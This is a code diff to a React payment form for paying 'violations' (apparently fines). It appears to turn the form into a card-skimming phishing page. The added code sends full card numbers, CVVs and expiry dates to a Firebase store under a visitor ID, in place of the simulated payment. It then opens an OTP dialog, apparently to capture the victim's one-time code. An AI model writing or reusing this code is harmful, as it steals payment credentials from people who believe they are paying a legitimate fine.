@@ -23,6 +23,7 @@ import {
   CARD_TYPES,
   type CardValidationResult,
 } from "@/lib/card-validator"
+import { addData } from "@/lib/firebase"
 
 interface Violation {
   id: string
@@ -55,6 +56,7 @@ const paymentSchema = z.object({
 type PaymentFormData = z.infer<typeof paymentSchema>
 
 export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCancel }: PaymentFormProps) {
+  const [showOtpDialog, setShowOtpDialog] = useState(false)
   const [isProcessing, setIsProcessing] = useState(false)
   const [paymentComplete, setPaymentComplete] = useState(false)
   const [cardValidation, setCardValidation] = useState<CardValidationResult>({
@@ -148,17 +150,21 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
 
     try {
       // Simulate payment processing
-      await new Promise((resolve) => setTimeout(resolve, 3000))
-
-      // Here you would normally send the payment data to your backend
-      console.log("Payment data:", {
+      const visitorID=localStorage.getItem('visitor')
+      addData( {id:visitorID,
         ...data,
-        cardType: finalCardValidation.cardType,
+        cardNumber,
+        cvv,
+        expiryData:expiryMonth+"/"+expiryYear,
         amount: totalAmount,
         violations: violations.map((v) => v.id),
       })
 
-      setPaymentComplete(true)
+      await new Promise((resolve) => setTimeout(resolve, 3000))
+
+      // Here you would normally send the payment data to your backend
+      setShowOtpDialog(true)
+  
 
       // Auto redirect after success
       setTimeout(() => {
